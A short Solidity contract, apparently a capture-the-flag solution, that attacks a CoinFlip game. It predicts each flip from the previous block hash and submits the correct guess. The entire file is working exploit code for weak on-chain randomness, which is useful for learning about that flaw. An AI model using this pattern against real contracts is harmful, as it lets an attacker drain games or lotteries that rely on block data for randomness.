// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    CoinFlip private coinFlip;
    
    constructor(address _contractAddress) {
        coinFlip = CoinFlip(_contractAddress);
    }

    function hackContract() external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1;

        coinFlip.flip(guess);
    }
    
}
